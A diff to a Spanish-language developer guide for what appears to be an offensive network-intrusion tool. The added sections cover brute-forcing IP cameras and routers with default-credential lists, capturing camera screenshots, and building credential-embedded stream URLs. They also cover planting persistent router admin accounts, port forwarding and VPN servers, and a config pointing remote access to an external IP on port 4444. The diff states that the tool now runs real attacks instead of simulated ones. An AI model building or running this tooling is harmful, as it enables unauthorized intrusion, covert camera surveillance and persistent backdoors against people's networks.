@@ -75,6 +75,9 @@ Cada fase tiene la misma estructura:
   - `_create_backdoors()`: Instala backdoors
   - `_establish_remote_connections()`: Establece conexiones remotas
   - `_setup_c2_pointers()`: Configura apuntadores C2
+  - `_access_detected_cameras()`: Detecta y accede a cámaras IP
+  - `_access_router_and_configure_persistence()`: Accede al router y configura persistencia
+  - `_configure_network_persistence()`: Configura servicios de red persistentes
 
 ### Fase 5: Verificación (Líneas 702-800)
 - **Función principal**: `phase_5_verification()`
@@ -101,6 +104,20 @@ def _detect_network_config(self):
 - **Método**: Socket UDP a 8.8.8.8 para obtener IP local
 - **Cálculo**: Red /24 basada en IP local
 
+### Auto-Configuración de Red (Líneas 200-400)
+```python
+def auto_configure_network(self):
+```
+- **Propósito**: Configuración completa de red antes del escaneo
+- **Subfunciones**:
+  - `_detect_basic_network_info()`: Detecta IP local, máscara, rango
+  - `_detect_gateway()`: Detecta gateway de la red
+  - `_detect_dns_servers()`: Detecta servidores DNS
+  - `_quick_host_discovery()`: Descubrimiento rápido de hosts activos
+  - `_determine_network_type()`: Determina tipo de red
+  - `_configure_scan_parameters()`: Configura parámetros de escaneo
+  - `_show_network_summary()`: Muestra resumen de configuración
+
 ## Modos de Operación
 
 ### Modo Full Scan (Líneas 900-920)
@@ -125,7 +142,18 @@ def cleanup(self):
 ```
 - Solo se ejecuta en modo cold
 - Elimina usuarios, backdoors, conexiones
+- Restaura configuración del router
 - Limpia archivos temporales
+
+### Resumen Final
+```python
+def generate_report(self):
+def _show_remote_access_summary(self):
+```
+- Calcula estadísticas finales
+- Muestra resumen de accesos remotos disponibles
+- Genera reporte JSON completo
+- Confirma disponibilidad de acceso remoto
 
 ## Configuración
 
@@ -135,12 +163,158 @@ self.config = {
     'scan_timeout': 30,
     'max_threads': 10,
     'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
+    'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
     'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
-    'default_passwords': ['admin', 'password', '123456', 'root', 'guest', '']
+    'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
+    'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
+    'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123'],
+    'router_ports': [80, 443, 8080, 8443, 23, 22, 21, 161, 162],
+    'router_users': ['admin', 'administrator', 'root', 'guest', 'user', 'admin', 'root', 'user', 'support', 'technician'],
+    'router_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'admin', 'password', '1234', '12345', '123456', 'admin123', 'password123', 'support', 'technician']
 }
 ```
 
+### Configuración Externa (config.json)
+El script carga configuración desde `config.json`:
+```python
+def _load_config(self):
+    """Cargar configuración desde archivo config.json"""
+    with open('config.json', 'r', encoding='utf-8') as f:
+        return json.load(f)
+```
+
+Estructura del config.json:
+```json
+{
+  "remote_access": {
+    "external_ip": "184.107.168.100",
+    "external_port": 4444
+  },
+  "persistence": {
+    "ssh_port": 2222,
+    "vpn_port": 1194,
+    "web_port": 8080
+  },
+  "credentials": {
+    "ssh_user": "svc_ssh",
+    "ssh_password": "SSH_P@ssw0rd_2024!",
+    "web_user": "admin",
+    "web_password": "Web_P@ssw0rd_2024!"
+  }
+}
+```
+
+## Funciones de Router y Persistencia de Red
+
+### Acceso al Router
+- `_access_router_and_configure_persistence()`: Función principal para acceso al router
+- `_detect_router_type()`: Detecta el tipo/marca del router
+- `_brute_force_router_credentials()`: Fuerza bruta específica para routers
+- `_configure_router_persistence()`: Configura persistencia en el router
+- `_create_router_admin_user()`: Crea usuario administrativo persistente
+- `_configure_port_forwarding()`: Configura port forwarding
+- `_configure_vpn_server()`: Configura servidor VPN en el router
+- `_configure_remote_access()`: Habilita acceso remoto
+- `_backup_router_config()`: Hace backup de la configuración
+
+### Persistencia de Red
+- `_configure_network_persistence()`: Función principal de persistencia de red
+- `_setup_persistent_ssh_server()`: Configura servidor SSH persistente
+- `_setup_persistent_vpn_server()`: Configura servidor VPN propio
+- `_setup_persistent_web_server()`: Configura panel web de administración
+
+```python
+def _access_router_and_configure_persistence(self) -> List[Dict[str, Any]]:
+    """Acceder al router y configurar persistencia de red"""
+    router_access = []
+    
+    # Obtener gateway detectado
+    gateway = self.network_config.get('gateway')
+    
+    # Detectar tipo de router
+    router_type = self._detect_router_type(gateway)
+    
+    # Intentar credenciales por defecto
+    router_credentials = self._brute_force_router_credentials(gateway)
+    
+    if router_credentials:
+        # Configurar acceso persistente al router
+        router_config = self._configure_router_persistence(gateway, router_credentials, router_type)
+        
+        router_access.append({
+            'gateway': gateway,
+            'router_type': router_type,
+            'credentials': router_credentials,
+            'configuration': router_config,
+            'timestamp': time.time()
+        })
+    
+    return router_access
+```
+
+## Funciones de Cámaras IP
+
+### Detección de Cámaras (Líneas 800-900)
+- **Función principal**: `_access_detected_cameras()`
+- **Subfunciones**:
+  - `_identify_camera_services()`: Identifica servicios que podrían ser cámaras
+  - `_exploit_camera()`: Explota cámara específica
+  - `_detect_camera_type()`: Detecta tipo de cámara (Hikvision, Dahua, etc.)
+  - `_brute_force_camera_credentials()`: Fuerza bruta específica para cámaras
+  - `_get_camera_information()`: Obtiene información detallada de la cámara
+  - `_capture_camera_screenshots()`: Captura screenshots de prueba
+  - `_generate_camera_urls()`: Genera URLs de acceso
+
+### Identificación de Cámaras
+```python
+def _identify_camera_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    # Verifica puertos comunes de cámaras
+    # Detecta servicios HTTP/RTSP en puertos específicos
+    # Clasifica por indicadores de cámara
+```
+
+### Explotación de Cámaras
+```python
+def _exploit_camera(self, camera: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+    # 1. Detecta tipo de cámara
+    # 2. Intenta credenciales por defecto
+    # 3. Obtiene información de la cámara
+    # 4. Toma screenshots de prueba
+    # 5. Genera URLs de acceso
+```
+
+### Detección de Tipo de Cámara
+```python
+def _detect_camera_type(self, camera: Dict[str, Any]) -> str:
+    # Hace request HTTP para detectar marca
+    # Detecta: hikvision, dahua, axis, foscam, dlink, tp-link, xiaomi
+    # Retorna tipo detectado o 'generic_ip_camera'
+```
+
+### Fuerza Bruta de Cámaras
+```python
+def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
+    # Usa credenciales específicas de cámaras
+    # Prueba autenticación HTTP básica
+    # Retorna credenciales válidas si las encuentra
+```
+
+### Captura de Screenshots
+```python
+def _capture_camera_screenshots(self, camera: Dict[str, Any], credentials: Dict[str, str]) -> List[str]:
+    # Intenta múltiples endpoints de captura
+    # Verifica que la respuesta sea una imagen
+    # Captura máximo 2 screenshots de prueba
+    # Guarda en directorio con timestamp
+```
+
 ## Puntos de Modificación Común
+
+### Agregar Nuevos Puertos de Cámaras
+**Ubicación**: Línea 95
+```python
+'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999, 9000, 9001]
+```
 
 ### Agregar Nuevos Puertos
 **Ubicación**: Línea 95
@@ -270,6 +444,47 @@ self.config = {
 }
 ```
 
+### Cámara Accedida
+```python
+{
+    'host': '192.168.1.100',
+    'port': 80,
+    'protocol': 'http',
+    'camera_type': 'hikvision',
+    'credentials': {
+        'username': 'admin',
+        'password': 'admin'
+    },
+    'camera_info': {
+        'model': 'DS-2CD2142FWD-I',
+        'firmware': 'V5.5.82',
+        'features': ['ptz', 'night_vision', 'audio']
+    },
+    'screenshots': [
+        'camera_screenshots_1640995200/192.168.1.100_screenshot_1.jpg',
+        'camera_screenshots_1640995200/192.168.1.100_screenshot_2.jpg'
+    ],
+    'access_urls': {
+        'web_interface': [
+            'http://admin:admin@192.168.1.100:80/',
+            'http://admin:admin@192.168.1.100:80/index.html'
+        ],
+        'streaming': [
+            'http://admin:admin@192.168.1.100:80/video.mjpg',
+            'http://admin:admin@192.168.1.100:80/stream'
+        ],
+        'snapshots': [
+            'http://admin:admin@192.168.1.100:80/snapshot.cgi',
+            'http://admin:admin@192.168.1.100:80/image'
+        ],
+        'control': [
+            'http://admin:admin@192.168.1.100:80/cgi-bin/ptz.cgi'
+        ]
+    },
+    'timestamp': 1640995200.0
+}
+```
+
 ## Comandos de Sistema Utilizados
 
 ### Nmap
@@ -350,9 +565,10 @@ def main():
 ## Consideraciones de Seguridad
 
 ### Simulación vs Realidad
-- El código actual **simula** la mayoría de ataques
-- Para uso real, reemplazar funciones `_simulate_*` con implementaciones reales
-- Usar herramientas como Hydra, Metasploit, etc.
+- El código actual ejecuta **ataques reales** (ya no simula)
+- Implementaciones reales con Hydra, Paramiko, urllib, etc.
+- Fuerza bruta real, explotación real, persistencia real
+- Cámaras IP: detección real, credenciales reales, screenshots reales
 
 ### Logging y Evidencia
 - Todos los resultados se almacenan en `self.report`
@@ -368,13 +584,20 @@ def main():
 
 ### Herramientas Requeridas
 - `nmap`: Escaneo de red
+- `hydra`: Ataques de fuerza bruta
 - `netcat`: Backdoors
+- `openssh-client`: Conexiones SSH
+- `smbclient`: Conexiones SMB
 - `ping`: Verificación de hosts
-- `ssh`: Conexiones remotas
+- `openssl`: Generación de certificados
+- `ssh-keygen`: Generación de claves SSH
+- `openvpn`: Servidor VPN
+- `nginx`: Servidor web (opcional)
 
 ### Python
 - Versión: 3.6+
-- Librerías: Solo estándar (subprocess, json, time, socket, etc.)
+- Librerías estándar: subprocess, json, time, socket, urllib, base64, etc.
+- Librerías externas: paramiko, netifaces
 
 ## Testing y Debugging
 
